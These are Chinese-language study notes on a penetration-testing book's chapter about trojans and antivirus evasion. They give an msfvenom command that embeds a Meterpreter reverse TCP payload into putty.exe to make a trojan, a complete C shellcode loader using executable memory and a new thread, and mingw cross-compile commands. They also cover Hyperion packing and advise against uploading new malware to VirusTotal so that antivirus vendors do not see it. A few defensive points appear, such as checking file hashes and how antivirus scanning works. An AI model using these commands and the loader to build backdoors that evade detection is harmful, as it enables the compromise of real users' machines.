零 
1 这本书是2019年出版的，实际成书我估计在2014年甚至13年，因而该书说其免杀技术可行，这一点存疑。

2 在那个时代，内存马被视为免杀的救星，但是伴随着现在的行为监控技术的发展，内存马也不见得好。

3 在那个时代，社工已经是大头了。







一 12.1
（零）
1 木马程序的精确概念。

2 一版古早的vsftpd曾经被一个黑客植入过后门（植入的过程是该黑客攻破了vsftpd的服务器，拿到了vsftpd的源码，在植入后门后又使病毒程度覆盖源程序），这个vsftpd就成了木马，成了一个更大的backdoor。



（一）使用msf进行最基本的免杀
1 使用msfvenom将payload嵌入到正常程序中以形成木马：
（1）-x <宿主程序>
将payload嵌入到正常程序中。
（2）-k
确保宿主程序执行连贯性。

比如将病毒植入putty.exe：msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -x putty.exe -k -f exe -o p.exe

2 使用md5sum或者sha256sum等计算木马程序的哈希值，你会发现和源程序的（在官网上查看）不一样，这也是普通用户防御木马程序的手段。







二 12.2
1 防病毒软件的原理：
（1）静态分析。
（2）动态分析。

2 沙箱是一种隔离环境，用于安全地运行和测试程序或代码。它确保程序在受限的空间中运行，防止对系统或其他应用造成伤害。







三 12.3：Microsoft Security Essentials：对msf的查杀率还是挺高的







四 12.4：查杀网站：VT
1 https://www.virustotal.com/gui/home/upload

2 如果你的malvare是足够新的，那么请不要将之上传到vt，因为vt会向其使用的av引擎的背后厂商透露用户上传的malvare。







五 12.5：免杀技术（四种工具全是Windows环境的加壳法）
（一）msf编码：详见msf文档。




（二）交叉编译：跨平台编译即在一个平台上编译另一个平台的可执行程序。
在Linux上编译exe：
1 准备一个模板，就是payload加载器用来加载shellcode：把shellcode当成一个函数去执行。
#include <stdio.h>
#include <windows.h>

unsigned char shellcode[] = ;

int main(void) {
    // 分配内存
    void* shellcodeMemory = VirtualAlloc(NULL, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!shellcodeMemory) {
        printf("VirtualAlloc failed.\n");
        return 1;
    }

        // 将shellcode拷贝到分配的内存中
    RtlMoveMemory(shellcodeMemory, shellcode, sizeof(shellcode));

    // 创建线程以运行shellcode
    HANDLE threadHandle = CreateThread(
        NULL,                    // 默认安全属性
        0,                       // 默认堆栈大小
        (LPTHREAD_START_ROUTINE)shellcodeMemory, // 线程开始地址
        NULL,                    // 线程函数参数
        0,                       // 立即运行线程
        NULL                     // 线程ID（不需要）
    );

    if (!threadHandle) {
        printf("CreateThread failed.\n");
        VirtualFree(shellcodeMemory, 0, MEM_RELEASE);
        return 1;
    }

    // 等待线程完成
    WaitForSingleObject(threadHandle, INFINITE);

    // 清理
    CloseHandle(threadHandle);
    VirtualFree(shellcodeMemory, 0, MEM_RELEASE);

    return 0;
}

2 使用msfvenom生成模板的shellcode字符串：
（1）用-f c。
（2）可以编码。

3 使用mingw编译，方法和gcc一样。
sudo apt-get install mingw-w64
64位环境：x86_64-w64-mingw32-gcc example.c -o example.exe
32位环境：i686-w64-mingw32-gcc -m32 example.c -o example.exe



（三）Hyperion加密：
1 原理：该工具使用AES加密，但是为了防止密钥被他人获得，加密后丢弃密钥，解密时暴力破解密钥，注该工具极大压缩了密钥的可能键空间，因而破解是可行的。

2 Hyperion是一个Windows程序（现在应该开发出了Linux版本了），wine模拟器可用来在Linux环境下运行Windows程序。

3 可以结合编码方法。



（四）Veil



（五）远在天边近在眼前的免杀方法：与其用msf生成后门再想办法做免杀，不如从最底层开始自定义后门程序。